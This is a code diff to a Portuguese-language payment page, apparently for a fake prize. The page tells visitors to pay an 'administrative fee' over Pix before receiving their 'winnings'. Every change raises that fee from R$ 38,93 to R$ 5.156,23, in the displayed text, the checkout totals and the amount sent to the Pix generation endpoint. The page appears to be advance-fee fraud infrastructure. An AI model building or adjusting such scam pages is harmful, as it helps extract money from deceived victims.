@@ -127,7 +127,7 @@
                     </p>
 
                     <p>
-                        Após o pagamento da taxa administrativa no valor de <strong class="text-black text-lg">R$ 38,93</strong>, referente ao valor do seu ganho, você receberá o saldo correspondente de forma imediata em sua conta bancária via Pix.
+                        Após o pagamento da taxa administrativa no valor de <strong class="text-black text-lg">R$ 5.156,23</strong>, referente ao valor do seu ganho, você receberá o saldo correspondente de forma imediata em sua conta bancária via Pix.
                     </p>
                     
                     <div class="bg-yellow-50 p-6 border-l-4 border-yellow-500">
@@ -145,7 +145,7 @@
                     </div>
                     <div class="flex justify-between items-center border-t border-gray-200 pt-6 mt-6">
                         <span class="text-md font-black text-gray-800 uppercase tracking-tighter">Total a recolher:</span>
-                        <span class="text-3xl font-black text-black tracking-tighter">R$ 38,93</span>
+                        <span class="text-xl font-black text-black tracking-tighter">R$ 5.156,23</span>
                     </div>
                 </div>
 
@@ -197,7 +197,7 @@
                     <div class="co-divider"></div>
                     <div class="co-price-row">
                         <span class="co-price-label">Total</span>
-                        <span class="co-price-value">R$ 38,93</span>
+                        <span class="co-price-value">R$ 5.156,23</span>
                     </div>
                 </div>
 
@@ -295,7 +295,7 @@
                     <div class="co-divider"></div>
                     <div class="co-price-row">
                         <span class="co-price-label">Total</span>
-                        <span class="co-price-value" id="co-price-display">R$ 38,93</span>
+                        <span class="co-price-value" id="co-price-display">R$ 5.156,23</span>
                     </div>
                 </div>
 
@@ -309,7 +309,7 @@
                 <!-- Valor e código truncado -->
                 <div class="co-valor-pix-row">
                     <span class="co-valor-pix-label">Valor PIX:</span>
-                    <span class="co-valor-pix-value" id="pix-valor-display">R$ 38,93</span>
+                    <span class="co-valor-pix-value" id="pix-valor-display">R$ 5.156,23</span>
                 </div>
                 <div class="co-pix-key-truncated" id="pix-code-truncated"></div>
 
@@ -514,7 +514,7 @@
                 const resp = await fetch('/api/pix/gerar', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ nome, amount: 3893 }) // R$ 38,93 em centavos
+                    body: JSON.stringify({ nome, amount: 515623 }) // R$ 5.156,23 em centavos
                 });
                 const data = await resp.json();
 
